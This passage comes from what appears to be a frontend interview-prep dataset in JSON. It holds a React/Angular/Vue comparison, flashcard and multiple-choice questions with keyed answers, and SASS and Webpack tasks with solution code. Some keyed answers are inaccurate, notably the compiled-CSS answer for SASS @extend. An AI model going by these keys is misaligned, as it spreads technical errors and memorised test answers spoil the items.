automatically update the model and vice-versa. Vue.js supports both one-way and two-way binding with `v-model`.\n-   **DOM**: Both React and Vue.js utilize a Virtual DOM, which is an in-memory representation of the real DOM, allowing for efficient updates by minimizing direct DOM manipulations. Angular works directly with the Real DOM, but employs a sophisticated change detection mechanism and incremental DOM techniques for high performance.\n-   **Architecture**: All three are component-based. Angular strongly encourages an MVC (Model-View-Controller) or MVVM (Model-View-ViewModel) architecture. React and Vue are more flexible, allowing developers to choose their preferred architectural patterns.\n-   **Language**: React predominantly uses JavaScript and JSX (a syntax extension for JavaScript). Angular is built with and heavily relies on TypeScript. Vue.js uses JavaScript and standard HTML for templates, with optional TypeScript support.\n-   **Mobile Solutions**: React Native allows building native mobile apps from a single JavaScript codebase. Angular has Ionic (hybrid) and NativeScript (native). Vue.js offers Vue Native (native) and Quasar (hybrid).\n-   **Size & Performance**: Vue.js is typically the smallest, followed by React. Angular is the largest. All three offer high performance, largely due to their efficient DOM update strategies and build optimizations.\n-   **Flexibility & Opinionation**: React and Vue.js offer high flexibility, allowing developers to choose libraries for routing, state management, etc. Angular is highly opinionated, providing many built-in solutions, which can lead to faster development in large teams but less freedom.\n\n## When to Choose Each Framework\n\n### React is ideal when:\n-   You need a highly flexible and modular solution, allowing you to pick and choose libraries for routing, state management, etc.\n-   You're building a single-page application with frequent state updates and complex UIs.\n-   You have a team familiar with JavaScript (not necessarily TypeScript) and are comfortable with a larger ecosystem of third-party libraries.\n-   You want to potentially reuse code between web and mobile applications using React Native.\n-   You prioritize community support and a vast array of available packages.\n\n### Angular is ideal when:\n-   You're building large, enterprise-level applications that require a structured, opinionated, and full-featured framework.\n-   You need a framework with built-in solutions for common tasks (routing, forms, HTTP, dependency injection).\n-   Your team is familiar with TypeScript or prefers a strongly typed language.\n-   You value strict conventions and a clear architectural pattern for maintainability across large teams.\n-   You need comprehensive CLI tools for scaffolding and managing projects.\n\n### Vue.js is ideal when:\n-   You want the easiest learning curve for your team, making it quick to get started.\n-   You need a progressive framework that can be adopted incrementally, from enhancing small parts of an existing application to building full SPAs.\n-   You're building applications that need to be lightweight and fast, without the overhead of a full framework.\n-   You want a balance between the flexibility of React and some of the conventions of Angular.\n-   You need good documentation, clear APIs, and straightforward solutions, often leading to quicker development cycles for small to medium projects.\n\nUltimately, the 'best' framework depends on the specific project requirements, team skillset, and long-term maintenance considerations.",
          "examples": [
            {
              "id": "example_react_component_concept",
              "title": "Conceptual React Component (JSX)",
              "code": "```jsx\n// React Component using JSX\nimport React from 'react';\n\nfunction Greeting({ name }) {\n  return <h1>Hello, {name}!</h1>;\n}\n\n// Usage:\n// <Greeting name=\"World\" />\n```",
              "explanation": "This example illustrates a basic React functional component using JSX, React's preferred syntax for describing UI. It highlights React's component-based nature and the direct embedding of JavaScript expressions within markup.",
              "language": "jsx"
            },
            {
              "id": "example_angular_component_concept",
              "title": "Conceptual Angular Component (TypeScript/HTML)",
              "code": "```typescript\n// Angular Component (TypeScript)\nimport { Component, Input } from '@angular/core';\n\n@Component({\n  selector: 'app-greeting',\n  template: `<h1>Hello, {{ name }}!</h1>`,\n  styles: []\n})\nexport class GreetingComponent {\n  @Input() name: string = 'Guest';\n}\n\n// Usage in another template:\n// <app-greeting name=\"Angular World\"></app-greeting>\n```",
              "explanation": "This conceptual Angular component demonstrates its use of decorators (`@Component`, `@Input`), TypeScript for strong typing, and separate template/style definitions. Angular's opinionated structure and use of specific module imports are evident.",
              "language": "typescript"
            },
            {
              "id": "example_vue_component_concept",
              "title": "Conceptual Vue Component (JavaScript/HTML)",
              "code": "```html\n<!-- Vue Component (HTML Template/JavaScript) -->\n<template>\n  <h1>Hello, {{ name }}!</h1>\n</template>\n\n<script>\nexport default {\n  props: {\n    name: {\n      type: String,\n      default: 'Vue World'\n    }\n  }\n};\n</script>\n\n<!-- Usage in another template: -->\n<!-- <Greeting name=\"Vue World\" /> -->\n```",
              "explanation": "This Vue.js component shows its typical Single File Component (SFC) structure with `<template>`, `<script>`, and optional `<style>` blocks. It emphasizes the use of standard HTML for templating and a straightforward `props` option for data passing, contributing to its gentle learning curve.",
              "language": "html"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "JavaScript",
            "Frameworks",
            "React",
            "Angular",
            "Vue.js",
            "Frontend Architecture",
            "Comparison",
            "Decision Making"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "HTML",
            "CSS",
            "JavaScript Fundamentals"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "requiredFor": [
            "Frontend Architect Roles",
            "Project Lead"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_sass_extend_1",
          "topic": "SASS Extend",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of the `@extend` directive in SASS?",
          "answer": "The `@extend` directive allows a selector to inherit the styles of another selector, promoting code reuse and reducing repetition in CSS.",
          "options": [],
          "analysisPoints": [
            "Checks understanding of SASS `@extend`'s core function.",
            "Differentiates `@extend` from mixins (though not explicitly covered in theory, good to keep distinct)."
          ],
          "keyConcepts": [
            "SASS",
            "Extend",
            "Code Reuse"
          ],
          "evaluationCriteria": [
            "Ability to recall SASS directive purpose.",
            "Conciseness of explanation."
          ],
          "example": "",
          "tags": [
            "SASS",
            "CSS Preprocessors"
          ],
          "prerequisites": [
            "Basic SASS syntax"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_sass_extend_2",
          "topic": "SASS Placeholder Selectors",
          "level": "medium",
          "type": "mcq",
          "question": "Given the following SASS code, what will be the correct compiled CSS output for `.my-button`?\n\n```scss\n%base-styles {\n  font-size: 16px;\n  color: #333;\n}\n\n.my-button {\n  @extend %base-styles;\n  background-color: blue;\n}\n\n.another-element {\n  padding: 5px;\n}\n```",
          "answer": ".my-button {\n  font-size: 16px;\n  color: #333;\n  background-color: blue;\n}",
          "options": [
            ".my-button {\n  font-size: 16px;\n  color: #333;\n  background-color: blue;\n}",
            "%base-styles {\n  font-size: 16px;\n  color: #333;\n}\n.my-button {\n  background-color: blue;\n}",
            ".my-button, %base-styles {\n  font-size: 16px;\n  color: #333;\n}\n.my-button {\n  background-color: blue;\n}",
            ".my-button {\n  background-color: blue;\n}"
          ],
          "analysisPoints": [
            "Tests understanding of placeholder selectors not being output on their own.",
            "Confirms that `@extend` copies the styles into the extending selector.",
            "Distinguishes between SASS syntax and compiled CSS output."
          ],
          "keyConcepts": [
            "SASS Extend",
            "Placeholder Selectors",
            "CSS Compilation"
          ],
          "evaluationCriteria": [
            "Accuracy of CSS output prediction.",
            "Understanding of placeholder selector behavior."
          ],
          "example": "The `%base-styles` placeholder itself will not be output to CSS because it's only meant for `@extend`ing. When `.my-button` extends it, the styles defined in `%base-styles` are directly included within the `.my-button` rule set.",
          "tags": [
            "SASS",
            "CSS Compilation"
          ],
          "prerequisites": [
            "SASS Extend",
            "Placeholder Selectors"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_sass_extend_3",
          "topic": "SASS Extend Benefits and Drawbacks",
          "level": "hard",
          "type": "open",
          "question": "Discuss the primary benefits and potential drawbacks of using SASS `@extend` with placeholder selectors, particularly in the context of large-scale frontend projects. Provide an example of a scenario where `@extend` might lead to an undesirable outcome.",
          "answer": "Benefits: \n1.  **DRY (Don't Repeat Yourself)**: Promotes significant code reuse by allowing styles to be defined once and inherited by multiple selectors, leading to cleaner and more maintainable stylesheets.\n2.  **Semantic HTML**: Enables developers to write semantic class names in HTML (e.g., `.primary-button`, `.danger-button`) while keeping common visual styles abstracted in SASS.\n3.  **Reduced CSS Size (in some cases)**: By grouping selectors that share styles, `@extend` can sometimes produce smaller CSS output compared to using mixins without `@include`ing content, as it avoids duplicating property declarations.\n\nDrawbacks:\n1.  **Output Bloat (Over-extending)**: If an `@extend` is used without careful planning (e.g., extending a very generic selector from many specific selectors), it can lead to deeply nested, comma-separated selector lists in the compiled CSS. This increases file size and can make debugging difficult.\n2.  **Specificity Issues**: When extending a selector, the extended styles inherit the specificity of the *extending* selector. This can lead to unexpected style overrides if not properly managed, especially when dealing with complex style hierarchies.\n3.  **Source Order Issues**: The order in which `@extend` directives are processed by SASS can sometimes influence the final compiled CSS if rules are overridden, which might not always be intuitive.\n4.  **`@extend`-only Selectors**: While placeholder selectors (`%`) help, extending regular classes can still lead to the base class being included in the compiled CSS even if it's not directly used in HTML, unless a tool like PurgeCSS is used.\n\nExample of Undesirable Outcome:\nImagine you have a base style for 'boxes' and you extend it for every single component. If the base box has a `border-radius: 4px;` and then you later have a `special-box` that extends `box` but needs `border-radius: 0;`, you might end up with very long combined selectors for `box`, `special-box`, etc., for just a single property. If you then extend `box` from many unrelated elements, the resulting CSS `selector1, selector2, ..., selectorN { border-radius: 4px; }` can become excessively long and difficult to manage. It also might pull in styles into unexpected contexts if the extended styles are too broad for the extending elements.",
          "options": [],
          "analysisPoints": [
            "Evaluates a deep understanding of `@extend`'s impact on large projects.",
            "Requires critical thinking about both positive and negative consequences.",
            "Tests ability to articulate complex technical concepts.",
            "Challenges with a practical example of a drawback."
          ],
          "keyConcepts": [
            "SASS Extend",
            "CSS Architecture",
            "Maintainability",
            "Performance",
            "Specificity"
          ],
          "evaluationCriteria": [
            "Completeness of benefits and drawbacks.",
            "Clarity of explanation.",
            "Relevance and accuracy of the example scenario.",
            "Demonstrates critical thinking."
          ],
          "example": "The key is to understand that `@extend` is a compile-time feature that merges selectors. This is different from a mixin, which copies declarations. The drawbacks often stem from this merging behavior causing unintended side effects or bloat.",
          "tags": [
            "SASS",
            "Frontend Architecture",
            "Best Practices",
            "Performance"
          ],
          "prerequisites": [
            "SASS Extend",
            "CSS Specificity"
          ],
          "complexity": 8,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_react_prod_1",
          "topic": "React Production Mode",
          "level": "medium",
          "type": "mcq",
          "question": "What is the primary benefit of setting `process.env.NODE_ENV` to `'production'` when building a React application?\n\n```javascript\n// Using Webpack's DefinePlugin\nconst webpack = require('webpack');\n\nmodule.exports = {\n  // ... other config\n  plugins: [\n    new webpack.DefinePlugin({\n      'process.env.NODE_ENV': JSON.stringify('production')\n    })\n  ]\n};\n```",
          "answer": "It removes development-only warnings and enables performance optimizations.",
          "options": [
            "It enables Hot Module Replacement (HMR) for faster development.",
            "It allows for dynamic code splitting at runtime in the browser.",
            "It automatically deploys the application to a cloud server.",
            "It removes development-only warnings and enables performance optimizations."
          ],
          "analysisPoints": [
            "Tests knowledge of `NODE_ENV`'s impact on React builds.",
            "Distinguishes between development and production concerns.",
            "Identifies the core reasons for using production mode."
          ],
          "keyConcepts": [
            "React",
            "Production Mode",
            "Optimization",
            "Webpack DefinePlugin"
          ],
          "evaluationCriteria": [
            "Correctly identifies the main benefit.",
            "Avoids common misconceptions (HMR, runtime splitting)."
          ],
          "example": "Setting `process.env.NODE_ENV` to `'production'` signals to React and other libraries that the application is in a production environment. This triggers optimizations such as stripping out development warnings (e.g., `PropType` warnings, `key` warnings) and enabling more aggressive performance optimizations within React's reconciliation process, leading to a smaller, faster, and more efficient production bundle.",
          "tags": [
            "React",
            "Production",
            "Optimization",
            "Webpack"
          ],
          "prerequisites": [
            "Basic React Development",
            "Webpack concepts"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_prod_2",
          "topic": "Environment Variables in React Builds",
          "level": "easy",
          "type": "flashcard",
          "question": "Which Webpack plugin is commonly used to inject `process.env.NODE_ENV` into the bundled JavaScript?",
          "answer": "Webpack's `DefinePlugin`.",
          "options": [],
          "analysisPoints": [
            "Recalls the specific Webpack tool for environment variable injection.",
            "Reinforces the connection between `NODE_ENV` and build tools."
          ],
          "keyConcepts": [
            "Webpack",
            "DefinePlugin",
            "Environment Variables"
          ],
          "evaluationCriteria": [
            "Correctly identifies the plugin."
          ],
          "example": "",
          "tags": [
            "Webpack",
            "React",
            "Build Tools"
          ],
          "prerequisites": [
            "Webpack basics"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_react_prod_3",
          "topic": "Production Build Tools",
          "level": "medium",
          "type": "open",
          "question": "If you're using Create React App (CRA), how do you typically ensure your application is built in production mode? Do you need to manually configure Webpack's `DefinePlugin`?",
          "answer": "When using Create React App (CRA), you typically build your application for production by running the command `npm run build` or `yarn build`.\n\nNo, you do not need to manually configure Webpack's `DefinePlugin` when using CRA. CRA abstracts away the Webpack configuration, and its `build` script is pre-configured to automatically set `process.env.NODE_ENV` to `'production'` and apply all necessary optimizations (like minification, tree-shaking, code splitting, and development warning removal) during the build process.",
          "options": [],
          "analysisPoints": [
            "Tests practical knowledge of CRA build processes.",
            "Confirms understanding of how modern tools simplify configuration.",
            "Emphasizes the 'convention over configuration' aspect of CRA."
          ],
          "keyConcepts": [
            "Create React App",
            "Production Build",
            "Webpack Configuration"
          ],
          "evaluationCriteria": [
            "Correctly identifies the build command.",
            "Explains the role of CRA in abstracting configuration.",
            "Demonstrates understanding of automated optimizations."
          ],
          "example": "",
          "tags": [
            "React",
            "CRA",
            "Build Tools",
            "Deployment"
          ],
          "prerequisites": [
            "Familiarity with CRA"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_framework_comp_1",
          "topic": "Framework Types",
          "level": "easy",
          "type": "flashcard",
          "question": "Is React considered a full framework or a library?",
          "answer": "React is primarily considered a UI library.",
          "options": [],
          "analysisPoints": [
            "Tests basic classification of React.",
            "Highlights a fundamental difference between React and Angular."
          ],
          "keyConcepts": [
            "React",
            "Library",
            "Framework"
          ],
          "evaluationCriteria": [
            "Accurate classification."
          ],
          "example": "",
          "tags": [
            "React",
            "Frameworks"
          ],
          "prerequisites": [
            "Basic understanding of React"
          ],
          "complexity": 2,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_framework_comp_2",
          "topic": "Data Binding",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following JavaScript frameworks primarily uses two-way data binding by default for forms, making changes in the UI automatically reflect in the model and vice-versa?",
          "answer": "Angular",
          "options": [
            "React",
            "Angular",
            "Vue.js (only with `v-model` which is optional)",
            "Ember.js"
          ],
          "analysisPoints": [
            "Compares data binding philosophies across frameworks.",
            "Focuses on default behavior and common use cases.",
            "Distinguishes between one-way and two-way binding."
          ],
          "keyConcepts": [
            "Data Binding",
            "Two-way Data Binding",
            "React",
            "Angular",
            "Vue.js"
          ],
          "evaluationCriteria": [
            "Correctly identifies Angular's default data binding.",
            "Shows understanding of the concept."
          ],
          "example": "Angular's `[(ngModel)]` syntax exemplifies two-way data binding, simplifying form handling by automatically synchronizing data between the component's model and the input element's value. While Vue.js also supports two-way binding with `v-model`, it's an opt-in feature, and React is fundamentally based on one-way data flow.",
          "tags": [
            "Angular",
            "Data Binding",
            "Frameworks"
          ],
          "prerequisites": [
            "Familiarity with data binding concepts"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_framework_comp_3",
          "topic": "DOM Interaction",
          "level": "medium",
          "type": "open",
          "question": "Explain the difference in how React and Angular interact with the Document Object Model (DOM) to update the user interface. What are the implications of these different approaches on performance and development?",
          "answer": "React uses a **Virtual DOM**. When the state of a component changes, React first updates its in-memory representation of the DOM (the Virtual DOM). It then performs a 'diffing' algorithm to compare the new Virtual DOM with the previous one. Only the minimum necessary changes are then 'batched' and applied to the real DOM. This minimizes direct manipulation of the real DOM, which is generally considered a slow operation.\n\nAngular, on the other hand, works directly with the **Real DOM**. It uses a sophisticated change detection mechanism. When data bound to the UI changes (e.g., through user events, HTTP responses, or timers), Angular's change detection cycle runs. It traverses the component tree, checking for changes in bound data and, if detected, directly updates the specific parts of the real DOM. Angular also leverages techniques like incremental DOM and Zone.js (in older versions) or modern browser APIs to optimize these updates.\n\n**Implications:**\n\n*   **Performance**: Both approaches are highly optimized and perform well for most applications. React's Virtual DOM can lead to very efficient updates by minimizing real DOM operations. Angular's direct DOM manipulation, combined with its optimized change detection (and techniques like `OnPush` change detection strategy), also yields high performance. The actual performance bottleneck usually lies in application-specific logic, not the DOM update strategy itself.\n*   **Development Experience**: \n    *   **React**: The Virtual DOM abstraction can simplify development by allowing developers to think about UI as a function of state, without directly manipulating the DOM. However, it requires manually optimizing component re-renders (e.g., using `React.memo` or `useMemo`/`useCallback`).\n    *   **Angular**: Direct DOM interaction means that developers are closer to how the browser works, but Angular's change detection handles many optimizations automatically. Understanding Angular's change detection strategies is key for advanced performance tuning.",
          "options": [],
          "analysisPoints": [
            "Requires detailed explanation of Virtual DOM vs. Real DOM with Angular's specifics.",
            "Compares performance implications, acknowledging both are optimized.",
            "Discusses impact on developer workflow and potential optimization strategies."
          ],
          "keyConcepts": [
            "Virtual DOM",
            "Real DOM",
            "Change Detection",
            "React",
            "Angular",
            "Performance"
          ],
          "evaluationCriteria": [
            "Accuracy and depth of explanation for both frameworks.",
            "Coherent comparison of implications.",
            "Demonstrates understanding of underlying mechanisms."
          ],
          "example": "",
          "tags": [
            "React",
            "Angular",
            "DOM",
            "Performance",
            "Frontend Architecture"
          ],
          "prerequisites": [
            "Understanding of DOM",
            "Basic knowledge of React/Angular"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_framework_comp_4",
          "topic": "Framework Use Cases",
          "level": "hard",
          "type": "open",
          "question": "You are leading a new frontend project for a large enterprise. The project needs to be scalable, maintainable by a large team (some of whom are new to frontend development), and will heavily use TypeScript. There's a strong preference for a clear, opinionated structure. Based on these requirements, which JavaScript framework (React, Angular, or Vue.js) would you recommend and why?",
          "answer": "Based on the given requirements, I would recommend **Angular**.\n\nHere's the justification:\n\n1.  **Scalability and Large Enterprise Applications**: Angular is explicitly designed as a full-featured framework for large enterprise applications. Its comprehensive toolset (routing, state management, HTTP client, forms) and modular structure (NgModules, services, components) make it highly suitable for large-scale projects with many features and modules.\n2.  **Maintainability by a Large Team**: Angular's highly opinionated nature and strong conventions enforce a consistent project structure and coding style across the entire application. This is invaluable for large teams, especially when onboarding new developers, as it reduces cognitive load and ensures code readability and predictability. Everyone follows the same patterns, which streamlines collaboration and maintenance.\n3.  **Heavy TypeScript Usage**: Angular is built with TypeScript from the ground up and strongly encourages its use. This aligns perfectly with the requirement for heavy TypeScript usage, providing static typing benefits, improved tooling, and fewer runtime errors, which are critical for large, complex codebases.\n4.  **Clear, Opinionated Structure**: Angular's structured approach, including its Dependency Injection system, module system, and specific ways of doing things, provides a clear architectural blueprint. This reduces decision fatigue for developers and ensures a consistent approach to application development, which is exactly what a team that values opinionated structure needs.\n\nWhile React is flexible and Vue.js has a gentle learning curve, neither matches Angular's inherent strengths in providing a full, opinionated framework ideal for large enterprise applications with a strong TypeScript focus and a need for highly consistent development practices across a large team.",
          "options": [],
          "analysisPoints": [
            "Tests ability to apply framework knowledge to real-world scenarios.",
            "Requires justification based on multiple criteria.",
            "Evaluates understanding of 'When to Choose' sections.",
            "Promotes critical thinking and decision-making."
          ],
          "keyConcepts": [
            "Framework Selection",
            "Enterprise Applications",
            "TypeScript",
            "Scalability",
            "Team Collaboration"
          ],
          "evaluationCriteria": [
            "Correct framework recommendation.",
            "Comprehensive and logical justification based on all criteria.",
            "Demonstrates strong understanding of framework strengths."
          ],
          "example": "",
          "tags": [
            "Framework Selection",
            "Frontend Architecture",
            "Project Management",
            "TypeScript"
          ],
          "prerequisites": [
            "Deep understanding of React, Angular, Vue.js characteristics"
          ],
          "complexity": 9,
          "interviewFrequency": 9,
          "learningPath": "expert"
        },
        {
          "id": "question_framework_comp_5",
          "topic": "Learning Curve Comparison",
          "level": "easy",
          "type": "flashcard",
          "question": "Which of the three major JavaScript frameworks (React, Angular, Vue.js) is generally considered to have the gentlest learning curve?",
          "answer": "Vue.js.",
          "options": [],
          "analysisPoints": [
            "Recalls framework learning curve characteristics.",
            "Good for quick recall tests."
          ],
          "keyConcepts": [
            "Vue.js",
            "Learning Curve",
            "Frameworks"
          ],
          "evaluationCriteria": [
            "Correctly identifies Vue.js."
          ],
          "example": "",
          "tags": [
            "Vue.js",
            "Learning",
            "Frameworks"
          ],
          "prerequisites": [],
          "complexity": 2,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_framework_comp_6",
          "topic": "Mobile Solutions",
          "level": "medium",
          "type": "mcq",
          "question": "If a development team aims to build native mobile applications using a shared JavaScript codebase from their web application, which of the following framework/library and its associated mobile solution would be most suitable?\n\n| Feature | React | Angular | Vue.js |\n| --- | --- | --- | --- |\n| **Mobile Solutions** | React Native | Ionic, NativeScript | Vue Native, Quasar |\n",
          "answer": "React with React Native",
          "options": [
            "Angular with Ionic",
            "React with React Native",
            "Vue.js with Quasar",
            "Angular with NativeScript"
          ],
          "analysisPoints": [
            "Tests understanding of 'native mobile applications' vs. hybrid.",
            "Checks association of framework with its primary native mobile solution.",
            "Evaluates the ability to choose based on specific requirements."
          ],
          "keyConcepts": [
            "React Native",
            "Native Mobile Development",
            "Framework Ecosystems"
          ],
          "evaluationCriteria": [
            "Identifies the best fit for native mobile from web codebase.",
            "Understands the distinction between native and hybrid."
          ],
          "example": "React Native allows developers to build truly native iOS and Android applications using React, leveraging JavaScript and the existing React knowledge base to write mobile-specific UI components that compile to native views. While Ionic and Quasar primarily focus on hybrid apps (web views), NativeScript and Vue Native also target native, but React Native is arguably the most dominant and recognized solution for shared codebase native development among the given options.",
          "tags": [
            "React Native",
            "Mobile Development",
            "Cross-Platform",
            "React"
          ],
          "prerequisites": [
            "Understanding of mobile development paradigms"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        }
      ],
      "tasks": [
        {
          "id": "task_sass_refactor_buttons",
          "title": "Refactor Button Styles with SASS @extend",
          "description": "\nRefactor the provided CSS button styles using SASS `@extend` and a placeholder selector to minimize code repetition and improve maintainability. \n\n**Requirements:**\n\n1.  Create a SASS placeholder selector (e.g., `%btn-base`) that contains the common styles shared by all buttons.\n2.  Update the `.primary-button` and `.secondary-button` classes to `@extend` this placeholder.\n3.  Ensure the compiled CSS output is concise and correctly reflects the inheritance.\n\nYour solution should demonstrate how `@extend` reduces redundancy while maintaining distinct button styles.\n",
          "difficulty": "medium",
          "startingCode": "```scss\n/* Original SCSS/CSS to refactor */\n.primary-button {\n  padding: 10px 20px;\n  border: none;\n  cursor: pointer;\n  font-size: 16px;\n  border-radius: 5px;\n  background-color: #007bff;\n  color: white;\n}\n\n.secondary-button {\n  padding: 10px 20px;\n  border: none;\n  cursor: pointer;\n  font-size: 16px;\n  border-radius: 5px;\n  background-color: #6c757d;\n  color: white;\n}\n\n.danger-button {\n  padding: 10px 20px;\n  border: none;\n  cursor: pointer;\n  font-size: 16px;\n  border-radius: 5px;\n  background-color: #dc3545;\n  color: white;\n}\n```",
          "solutionCode": "```scss\n%btn-base {\n  padding: 10px 20px;\n  border: none;\n  cursor: pointer;\n  font-size: 16px;\n  border-radius: 5px;\n  font-family: sans-serif; /* Added for completeness */\n}\n\n.primary-button {\n  @extend %btn-base;\n  background-color: #007bff;\n  color: white;\n}\n\n.secondary-button {\n  @extend %btn-base;\n  background-color: #6c757d;\n  color: white;\n}\n\n.danger-button {\n  @extend %btn-base;\n  background-color: #dc3545;\n  color: white;\n}\n\n/* Expected Compiled CSS Output:\n.primary-button,\n.secondary-button,\n.danger-button {\n  padding: 10px 20px;\n  border: none;\n  cursor: pointer;\n  font-size: 16px;\n  border-radius: 5px;\n  font-family: sans-serif;\n}\n\n.primary-button {\n  background-color: #007bff;\n  color: white;\n}\n\n.secondary-button {\n  background-color: #6c757d;\n  color: white;\n}\n\n.danger-button {\n  background-color: #dc3545;\n  color: white;\n}\n*/\n```",
          "testCases": [
            "Verify that `padding`, `border`, `cursor`, `font-size`, `border-radius` are correctly inherited by all button classes.",
            "Ensure that each button class retains its unique `background-color` and `color`.",
            "Confirm that the compiled CSS output groups the common styles under a single selector list for efficiency.",
            "Validate that the placeholder selector (`%btn-base`) itself does not appear in the compiled CSS."
          ],
          "hints": [
            "Identify the common properties first across all button classes.",
            "Remember that placeholder selectors start with `%` and are not compiled unless extended.",
            "Think about how SASS groups selectors that `@extend` the same placeholder in the final CSS."
          ],
          "tags": [
            "SASS",
            "CSS Preprocessors",
            "Refactoring",
            "Maintainability",
            "DRY"
          ],
          "timeEstimate": 20,
          "prerequisites": [
            "Basic SASS Syntax",
            "Understanding of CSS properties"
          ],
          "complexity": 5,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "SASS Extend",
            "Placeholder Selectors"
          ]
        },
        {
          "id": "task_react_webpack_prod_config",
          "title": "Configure Webpack for React Production Build",
          "description": "\nSet up a basic Webpack configuration file (`webpack.config.js`) to build a simple React application for production. The configuration should ensure that React is aware it's running in production mode, leading to optimizations.\n\n**Requirements:**\n\n1.  Define the `mode` as 'production' in the Webpack configuration.\n2.  Use `webpack.DefinePlugin` to explicitly set `process.env.NODE_ENV` to `'production'` (even if `mode: 'production'` handles it, this explicitly shows understanding).\n3.  Include a basic entry point and output path.\n4.  Add a rule for processing `.js` or `.jsx` files with Babel (assume `@babel/preset-react` and `@babel/preset-env` are configured).\n\nYour solution should demonstrate how to manually configure a production build with Webpack for a React app.\n",
          "difficulty": "medium",
          "startingCode": "```javascript\n// webpack.config.js\nconst path = require('path');\nconst webpack = require('webpack');\n\nmodule.exports = {\n  // TODO: Configure for production mode\n  // TODO: Use DefinePlugin\n  // TODO: Add entry and output\n  // TODO: Add Babel loader for React\n\n  // Example of a simple React component (not part of webpack.config.js, just for context)\n  // src/index.js:\n  // import React from 'react';\n  // import ReactDOM from 'react-dom/client';\n  // function App() {\n  //   if (process.env.NODE_ENV !== 'production') {\n  //     console.log('App running in development mode!');\n  //   }\n  //   return <div>Hello Production React!</div>;\n  // }\n  // const root = ReactDOM.createRoot(document.getElementById('root'));\n  // root.render(<App />);\n};\n```",
          "solutionCode": "```javascript\n// webpack.config.js\nconst path = require('path');\nconst webpack = require('webpack');\n\nmodule.exports = {\n  mode: 'production', // Webpack 4+ automatically applies many optimizations when mode is 'production'\n  entry: './src/index.js', // Assuming your main React app entry point is src/index.js\n  output: {\n    filename: 'bundle.js',\n    path: path.resolve(__dirname, 'dist'), // Output bundle to a 'dist' directory\n    clean: true, // Clean the output directory before rebuild\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.(js|jsx)$/,\n        exclude: /node_modules/,\n        use: {\n          loader: 'babel-loader',\n          options: {\n            presets: ['@babel/preset-react', '@babel/preset-env'], // Assumes these presets are installed\n          },\n        },\n      },\n    ],\n  },\n  plugins: [\n    // This ensures process.env.NODE_ENV is set to 'production' during compilation\n    // React and other libraries use this variable to enable/disable dev features\n    new webpack.DefinePlugin({\n      'process.env.NODE_ENV': JSON.stringify('production')\n    }),\n    // You might also add HtmlWebpackPlugin, MiniCssExtractPlugin etc. for a full setup\n  ],\n  resolve: {\n    extensions: ['.js', '.jsx'], // Allows importing .js and .jsx files without extension\n  },\n};\n```",
          "testCases": [
            "Verify `webpack.config.js` is syntactically correct and can be run by Webpack.",
            "Confirm that `mode: 'production'` is set in the configuration.",
            "Check for the presence and correct configuration of `webpack.DefinePlugin` for `process.env.NODE_ENV`.",
            "Ensure the Babel loader is correctly configured for `.js` and `.jsx` files, excluding `node_modules`.",
            "Conceptual test: If the `src/index.js` contains a `console.log` guarded by `process.env.NODE_ENV !== 'production'`, running the build should produce a bundle where that specific `console.log` statement is removed."
          ],
          "hints": [
            "Remember that `path.resolve(__dirname, 'dist')` is a common way to define an absolute output path.",
            "The `module.rules` array is where you define loaders for different file types.",
            "`DefinePlugin` needs the value to be stringified JSON.",
            "Webpack `mode: 'production'` handles a lot automatically, but explicitly using `DefinePlugin` shows granular control."
          ],
          "tags": [
            "Webpack",
            "React",
            "Production",
            "Build Tools",
            "JavaScript",
            "Babel"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "Basic Webpack knowledge",
            "Basic React app structure"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Webpack Configuration",
            "DefinePlugin",
            "Babel",
            "Environment Variables"
          ]
        },
        {
          "id": "task_choose_framework_scenario",
          "title": "Frontend Framework Selection for a New Project",
          "description": "\nYou are a lead frontend architect tasked with choosing the primary JavaScript framework for a new, large-scale web application. The application will be a complex dashboard for data visualization and management, requiring frequent UI updates and a high degree of interactivity. The development team is relatively small (5 developers), has mixed experience levels (some strong JavaScript, some newer to modern frameworks), and values rapid prototyping and the flexibility to integrate various third-party libraries for specific functionalities (e.g., charting, complex forms).\n\n**Requirements:**\n\n1.  Recommend **one** of the three frameworks (React, Angular, or Vue.js).\n2.  Provide a detailed **justification** for your choice, explicitly linking it to the project's requirements and team characteristics.\n3.  Briefly explain why the **other two frameworks would be less ideal** for this specific scenario, referencing their characteristics.\n",
          "difficulty": "hard",
          "startingCode": "// No coding required for this task. Focus on written justification.\n// Think about:\n// - Team size & experience\n// - Project complexity & type (dashboard, data viz, frequent updates)\n// - Need for flexibility vs. opinionation\n// - Integration with third-party libraries\n",
